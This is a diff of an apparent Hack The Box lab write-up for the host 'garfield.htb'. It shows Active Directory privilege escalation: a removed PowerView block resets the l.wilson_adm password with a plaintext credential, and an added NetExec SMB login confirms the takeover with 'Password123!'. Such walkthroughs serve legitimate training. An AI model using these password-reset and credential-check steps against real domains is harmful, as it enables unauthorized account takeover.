@@ -271,13 +271,18 @@ I now have a shell!
 
 This user can change the admin accounts password
 
-```python
-PS C:\> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('GARFIELD\l.wilson_adm', $SecPassword)
-PS C:\> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-PS C:\> Set-DomainUserPassword -Identity l.wilson_adm -AccountPassword $UserPassword -Credential $Cred
-PS C:\> 
-```
+![](Pasted%20image%2020261109192119.png)
 
 Since i dont know the `l.wilson` account creds i cannot do this remotely, but i can do it with powershell
+
+Ill transfer powerview via a python web server then use that to change the users password
+
+```python
+❯❯❯ nxc smb dc01.garfield.htb -u 'l.wilson_adm' -p 'Password123!'
+SMB         10.129.86.27    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.86.27    445    DC01             [+] garfield.htb\l.wilson_adm:Password123! 
+```
+
+This user is now compromised!
+
 
